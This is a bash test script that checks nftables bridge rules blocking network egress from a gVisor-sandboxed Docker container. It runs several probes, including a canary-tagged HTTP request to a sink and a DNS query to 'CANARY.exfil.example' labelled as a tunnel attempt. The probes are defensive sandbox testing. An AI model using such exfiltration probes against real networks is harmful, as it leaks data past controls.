#!/usr/bin/env bash
# Spike: enforce session egress on the VM side of the session's Docker bridge
# (nftables "bridge" family), with the runtime on gVisor's own network stack.
#
# The session network is a normal Docker bridge with NAT disabled (not
# --internal), so the runtime has a default route via the VM and every
# attempt, including to the internet or DNS, reaches the bridge and is
# logged before it is dropped.
#
# Run inside the VM:  scripts/vm.sh shell sudo bash spikes/bridge-nft/run.sh
set -uo pipefail
P=fgbr
SID=spike1
NET=$P-s-$SID
SUB=10.250.1
EGRESS=$P-egress
TABLE=fg_$SID

cleanup() {
  docker rm -f $(docker ps -aq --filter label=$P) >/dev/null 2>&1 || true
  docker network rm $NET $EGRESS >/dev/null 2>&1 || true
  nft delete table bridge $TABLE 2>/dev/null || true
}
trap cleanup EXIT
cleanup

docker build -q -t $P-tools - >/dev/null 2>&1 <<'EOF'
FROM alpine:3.20
RUN apk add --no-cache curl python3 iproute2 bind-tools
EOF

docker network create --label $P $EGRESS >/dev/null
docker network create --label $P --subnet $SUB.0/24 --gateway $SUB.1 \
  -o com.docker.network.bridge.enable_ip_masquerade=false \
  -o com.docker.network.bridge.name=br-$SID $NET >/dev/null

# Infrastructure containers: egress network first (and preferred as default route).
docker run -d --label $P --name $P-gw --network $EGRESS $P-tools python3 -m http.server 8443 >/dev/null
docker network connect --ip $SUB.2 $NET $P-gw
docker run -d --label $P --name $P-sink --network $NET --ip $SUB.3 $P-tools python3 -m http.server 8080 >/dev/null

# VM-side name of a container's veth on the session network.
host_port() {
  local pid idx
  pid=$(docker inspect -f '{{.State.Pid}}' "$1")
  idx=$(nsenter -t "$pid" -n ip -j addr | python3 -c "
import json,sys
for l in json.load(sys.stdin):
    if any(a.get('local','').startswith('$SUB.') for a in l.get('addr_info',[])):
        print(l['link_index'])")
  ip -j link | python3 -c "
import json,sys
print(next(l['ifname'] for l in json.load(sys.stdin) if l['ifindex']==$idx))"
}
GWP=$(host_port $P-gw); SINKP=$(host_port $P-sink)

load_rules() {  # $1 = extra accept rule for the runtime (positive control)
  nft delete table bridge $TABLE 2>/dev/null || true
  nft -f - <<EOF
table bridge $TABLE {
  chain from_session {
    type filter hook forward priority filter; policy accept;
    meta ibrname != "br-$SID" return
    iifname { "$GWP", "$SINKP" } accept
    ether type arp arp saddr ip $SUB.10 accept
    ether type ip ip saddr $SUB.10 ip daddr $SUB.2 tcp dport 8443 accept
    $1
    log prefix "fg-drop s=$SID " level warn
    drop
  }
  chain to_vm {
    type filter hook input priority filter; policy accept;
    meta ibrname != "br-$SID" return
    ether type arp accept
    log prefix "fg-drop-vm s=$SID " level warn
    drop
  }
}
EOF
  nft list table bridge $TABLE >/dev/null || { echo "FATAL: rules not loaded" >&2; exit 1; }
}

# Docker's embedded resolver (127.0.0.11) is the sandbox's own loopback under
# gVisor, so lookups would fail silently inside the sandbox. Point DNS at the
# bridge address instead: queries then reach the VM and are logged and dropped.
RESOLV=$(mktemp); echo "nameserver $SUB.1" > "$RESOLV"; chmod 644 "$RESOLV"
RT=(docker run --rm --label $P --runtime runsc --network $NET --ip $SUB.10
    -v "$RESOLV:/etc/resolv.conf:ro"
    --cap-drop ALL --security-opt no-new-privileges --read-only --user 65534:65534 $P-tools)
logs() { journalctl -k --no-pager -q | grep -c "s=$SID " ; }
R=()
check() {  # name, want, command
  local before after out
  before=$(logs)
  out=$(timeout 30 "${RT[@]}" sh -c "$3" 2>/dev/null | tail -1)
  sleep 1; after=$(logs)
  R+=("$(printf '%-34s want %-8s got %-8s logged %s' "$1" "$2" "${out:-none}" $((after-before)))")
}

load_rules ""
check "gateway :8443"               200     "curl -s -m 4 -o /dev/null -w %{http_code} http://$SUB.2:8443/ || echo BLOCKED"
check "gateway other port :22"      BLOCKED "curl -s -m 4 -o /dev/null -w %{http_code} http://$SUB.2:22/ || echo BLOCKED"
check "sink :8080"                  BLOCKED "curl -s -m 4 -o /dev/null -w %{http_code} http://$SUB.3:8080/?c=CANARY || echo BLOCKED"
check "internet raw IP 1.1.1.1"     BLOCKED "curl -s -m 4 -o /dev/null -w %{http_code} http://1.1.1.1/ || echo BLOCKED"
check "DNS query (tunnel attempt)"  BLOCKED "dig +time=2 +tries=1 CANARY.exfil.example A >/dev/null && echo OK || echo BLOCKED"
check "hostname lookup + fetch"     BLOCKED "curl -s -m 6 -o /dev/null -w %{http_code} https://example.com/ || echo BLOCKED"
check "VM via bridge IP :22"        BLOCKED "curl -s -m 4 -o /dev/null -w %{http_code} http://$SUB.1:22/ || echo BLOCKED"
check "Mac via Lima host 192.168.5.2" BLOCKED "curl -s -m 4 -o /dev/null -w %{http_code} http://192.168.5.2/ || echo BLOCKED"

load_rules "ether type ip ip daddr $SUB.3 tcp dport 8080 accept"
check "POSITIVE CONTROL: sink allowed" 200 "curl -s -m 4 -o /dev/null -w %{http_code} http://$SUB.3:8080/?c=CONTROL || echo BLOCKED"

printf '%s\n' "${R[@]}"
echo; echo "gateway default route: $(docker exec $P-gw ip route | grep default)"
echo "sink log:"; docker logs $P-sink 2>&1 | grep GET || echo "  (empty)"
echo "sample drop lines:"; journalctl -k --no-pager -q | grep "s=$SID " | tail -3
